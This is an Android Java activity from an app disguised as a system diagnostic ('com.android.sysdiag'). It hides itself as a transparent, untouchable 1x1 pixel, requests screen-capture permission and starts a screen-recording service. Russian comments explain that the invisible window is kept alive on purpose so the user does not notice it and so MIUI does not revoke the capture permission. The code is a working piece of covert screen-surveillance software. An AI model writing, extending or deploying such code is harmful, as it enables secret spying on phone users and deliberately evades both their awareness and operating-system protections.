package com.android.sysdiag;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationManagerCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CAPTURE = 0x1001;
    private static final int REQ_NOTIF   = 0x1002;

    private boolean requested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1x1 пиксель в углу экрана — activity формально видима,
        // но пользователь её не замечает.
        WindowManager.LayoutParams params = getWindow().getAttributes();
        params.width = 1;
        params.height = 1;
        params.gravity = Gravity.TOP | Gravity.START;
        params.x = 0;
        params.y = 0;
        params.alpha = 0f;
        params.flags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
        getWindow().setAttributes(params);
        getWindow().setDimAmount(0f);
        getWindow().setBackgroundDrawableResource(android.R.color.transparent);

        TextView invisible = new TextView(this);
        invisible.setText("");
        invisible.setBackgroundColor(Color.TRANSPARENT);
        setContentView(invisible);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!NotificationManagerCompat.from(this).areNotificationsEnabled()) {
                requestPermissions(
                    new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                    REQ_NOTIF
                );
                return;
            }
        }
        requestProjectionOnce();
    }

    private void requestProjectionOnce() {
        if (requested) return;
        requested = true;
        MediaProjectionManager mpm =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAPTURE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                ScreenCaptureService.start(this, resultCode, data);
                // НЕ закрываем activity. Она остаётся висеть 1x1 пикселем
                // в углу. Формально активна — MIUI не сбросит разрешение.
                // Опускаем её на дно стека, чтобы не мешать.
                try {
                    getWindow().setAttributes(getWindow().getAttributes());
                } catch (Throwable ignored) {}
            } else {
                Toast.makeText(this, "Diagnostics disabled", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] perms, int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);
        if (requestCode == REQ_NOTIF) requestProjectionOnce();
    }
    }
